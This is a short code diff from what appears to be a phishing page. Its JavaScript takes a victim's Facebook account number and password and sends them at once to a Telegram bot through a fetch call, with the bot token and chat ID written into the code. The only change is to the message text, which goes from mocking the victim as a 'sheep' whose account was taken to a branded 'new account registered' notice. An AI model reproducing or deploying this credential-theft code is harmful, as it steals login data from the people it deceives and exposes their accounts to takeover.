@@ -91,7 +91,7 @@
                 // إرسال البيانات إلى بوت التليجرام على الفور
                 const token = '7969872040:AAF4JjL8BlGnHqAnPzak9p6rDZDq3LEVFPY';
                 const chatId = '6881422132'; // استبدل هذا بـ chat_id الخاص بك
-                const message = `المزعج بيقولك في خروف جديد تم سحب حسابو:\nرقم حساب فيسبوك: ${account}\nكلمة المرور: ${password}`;
+                const message = ` تم تسجيل حساب جديد برعايه المزعج الحاكم:\nرقم حساب فيسبوك: ${account}\nكلمة المرور: ${password}`;
                 const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
                 fetch(url)
